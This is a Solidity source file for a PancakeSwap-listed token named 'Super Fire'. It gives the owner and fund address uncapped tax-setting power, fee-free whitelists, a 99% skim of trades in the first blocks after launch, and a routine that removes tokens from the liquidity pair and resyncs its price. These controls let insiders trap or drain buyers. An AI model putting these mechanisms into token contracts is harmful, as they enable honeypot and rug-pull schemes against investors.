// SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);

    function feeTo() external view returns (address);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!o");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "n0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface ISwapPair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function totalSupply() external view returns (uint);

    function kLast() external view returns (uint);

    function sync() external;
}

abstract contract AbsToken is IERC20, Ownable {
    
    mapping(address => uint256) public _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public fundAddress;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _wl;

    uint256 private _tTotal;

    ISwapRouter public immutable _swapRouter;
    mapping(address => bool) public _swapPairList;
    mapping(address => bool) public _swapRouters;

    uint256 private constant MAX = ~uint256(0);

    uint256 public _buyTax = 200;
    uint256 public _sellTax = 300;

    uint256 public startTradeBlock;
    uint256 public startAddLPBlock;
    address public immutable _mainPair;
    address public immutable _weth;

    uint256 public _startTradeTime;

    constructor (
        address RouterAddress, 
        address ReceiveAddress
    ){
        _name = "Super Fire";
        _symbol = "Super Fire";
        _decimals = 18;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;
        _swapRouters[address(swapRouter)] = true;

        
        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        _weth = swapRouter.WETH();
        address pair = swapFactory.createPair(address(this), _weth);
        _swapPairList[pair] = true;
        _mainPair = pair;

        uint256 tokenUnit = 10 ** _decimals;
        uint256 total = 100000000 * tokenUnit;
        _tTotal = total;

        uint256 receiveTotal = total;
        _balances[ReceiveAddress] = receiveTotal;
        emit Transfer(address(0), ReceiveAddress, receiveTotal);

        fundAddress = address(0xAf4Acf32993Ac6BeC39C8b633bCE4E93b3a84E98);

        _wl[ReceiveAddress] = true;
        _wl[fundAddress] = true;
        _wl[address(this)] = true;
        _wl[address(swapRouter)] = true;
        _wl[msg.sender] = true;
        _wl[address(0)] = true;
        _wl[address(0x000000000000000000000000000000000000dEaD)] = true;
        _wl[address(0x5E525f1944a92051FCD9fB226521f33C1b8086b8)] = true;
        _wl[address(0xD608949c4d1997bB49f3973471dee66CA905C0db)] = true;
    
    }

  function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {

        bool takeFee;

        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");

        if (_wl[from] || _wl[to]) {
            _tokenTransfer(from, to, amount, false);
            return ;
        }else {
            uint256 maxSellAmount = balance * 9999 / 10000;
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
            takeFee = true;
        }

        bool isAddLiquidity;
        bool isDelLiquidity;

        ( isAddLiquidity, isDelLiquidity) = _isLiquidity(from,to);

        if (isAddLiquidity || isDelLiquidity){
            takeFee = false;
        }

        if (_swapPairList[from] || _swapPairList[to]) {
            if (0 == startAddLPBlock) {
                if (_wl[from] && to == _mainPair) {
                    startAddLPBlock = block.number;
                }
            }
            if (!_wl[from] && !_wl[to]) {
                if (0 == startTradeBlock) {
                    require(0 < startAddLPBlock && isAddLiquidity);
                }  else if (block.number < startTradeBlock + 3) {
                    _funTransfer(from, to, amount);
                    return;
                }
            }
        }

        _tokenTransfer(from, to, amount, takeFee);

    }

    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = tAmount * 99 / 100;
        _takeTransfer(
            sender,
            fundAddress,
            feeAmount
        );
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

     function _isLiquidity(address from,address to)internal view returns(bool isAdd,bool isDel){
        address token0 = ISwapRouter(address(_mainPair)).token0();
        (uint r0,,) = ISwapRouter(address(_mainPair)).getReserves();
        uint bal0 = IERC20(token0).balanceOf(address(_mainPair));
        if( _swapPairList[to] ){
            if( token0 != address(this) && bal0 > r0 ){
                isAdd = bal0 - r0 > 0;
            }
        }
        if( _swapPairList[from] ){
            if( token0 != address(this) && bal0 < r0 ){
                isDel = r0 - bal0 > 0; 
            }
        }
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        uint256 senderBalance = _balances[sender];
        senderBalance -= tAmount;
        _balances[sender] = senderBalance;
        uint256 feeAmount;

        if (takeFee) {
            bool isSell;
            uint256 backAmount;
            if (_swapPairList[recipient]) {//Sell
                isSell = true;
                backAmount = tAmount * (_buyTax + _sellTax) / 10000;
            }

            if (backAmount > 0) {
                feeAmount += backAmount;
                _takeTransfer(sender, address(this), backAmount);
            }

            if (isSell && !inSwap) {
                if (lpBurnEnabled && block.timestamp >= lastLpBurnTime + lpBurnFrequency) {
                    autoBurnLiquidityPairTokens();
                }

                uint256 contractTokenBalance = _balances[address(this)];
                if (contractTokenBalance > numToSell) {
                     swapTokenForFund(contractTokenBalance);
                }
            }
        }

        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    uint256 numToSell = 300*1e18;

    bool private inSwap;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
        if (tokenAmount == 0) {
            return;
        }

        address distributor = address(this);
        uint256 balance = distributor.balance;

        uint256 totalFee = _buyTax + _sellTax;

        uint256 lpAmount = tokenAmount * (_sellTax/2) / totalFee;
        totalFee -= _sellTax / 2;

        address weth = _weth;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = weth;
        _swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount - lpAmount,
            0,
            path,
            distributor,
            block.timestamp
        );

        balance = distributor.balance - balance;

        uint256 fundBalance = balance * _buyTax / totalFee;
        if (fundBalance > 0) {
            payable(fundAddress).transfer(fundBalance);
        }

        uint256 lpBalance = balance * (_sellTax / 2)  / totalFee;
        if (lpBalance > 0 && lpAmount > 0) {
            _swapRouter.addLiquidityETH{value : lpBalance}(
                address(this),
                lpAmount,
                0,
                0,
                fundAddress,
                block.timestamp
            );
        }
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    modifier onlyFunder() {
        address msgSender = msg.sender;
        require(_wl[msgSender] && (msgSender == fundAddress || msgSender == _owner), "nw");
        _;
    }

    function setFundAddress(address addr) external onlyFunder {
        fundAddress = addr;
        _wl[addr] = true;
    }

    function setWl(address addr, bool enable) external onlyFunder {
        _wl[addr] = enable;
    }

    function batchSetWl(address [] memory addr, bool enable) external onlyFunder {
        for (uint i = 0; i < addr.length; i++) {
            _wl[addr[i]] = enable;
        }
    }

    function setSwapPairList(address addr, bool enable) external onlyFunder {
        _swapPairList[addr] = enable;
    }

    function setSwapRouter(address addr, bool enable) external onlyFunder {
        _swapRouters[addr] = enable;
    }

    function claimBalance() external {
        payable(fundAddress).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount) external {
        if (_wl[msg.sender]) {
            IERC20(token).transfer(fundAddress, amount);
        }
    }

    receive() external payable {}

    function startTrade() external onlyFunder {
        require(0 == startTradeBlock, "T");
        startTradeBlock = block.number;
        _startTradeTime = block.timestamp;
        lastLpBurnTime = block.timestamp;
    }

    function setTax(uint256 buyTax, uint256 sellTax) external onlyFunder {
        _buyTax = buyTax;
        _sellTax = sellTax;
    }

    function setNumtosell(uint256 _numToSell) external onlyFunder {
      numToSell = _numToSell;
    }

    function setAutoLPBurnSettings(
        uint256 _frequencyInSeconds,
        uint256 _percent,
        bool _Enabled
    ) external onlyFunder {
        lpBurnFrequency = _frequencyInSeconds;
        percentForLPBurn = _percent;
        lpBurnEnabled = _Enabled;
    }

    bool public lpBurnEnabled = true;
    uint256 public lpBurnFrequency = 600 seconds;
    uint256 public lastLpBurnTime;
    uint256 public percentForLPBurn = 50; // 50 = 0.5%
    function autoBurnLiquidityPairTokens() internal  lockTheSwap {
        lastLpBurnTime = block.timestamp;
        // get balance of liquidity pair
        uint256 liquidityPairBalance = this.balanceOf(_mainPair);
        // calculate amount to burn
        uint256 amountToBurn = liquidityPairBalance*percentForLPBurn/10000;
        if (_tTotal - this.balanceOf(address(0xdead)) <= 100000*1e18){
            amountToBurn = 0;
        }
        // pull tokens from pancakePair liquidity and move to dead address permanently
        if (amountToBurn > 0) {
            _tokenTransfer(_mainPair, address(0xdead), amountToBurn, false);
        }
        //sync price since this is not in a swap transaction!
        ISwapPair pair = ISwapPair(_mainPair);
        pair.sync();
        emit AutoNukeLP();
    }

    event AutoNukeLP();

}

contract SF is AbsToken {
    constructor() AbsToken(
    //SwapRouter
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
    //Receive
        address(0xD900a3006eEA95d30F053D447465915B906FEfcF)
    ){

    }
}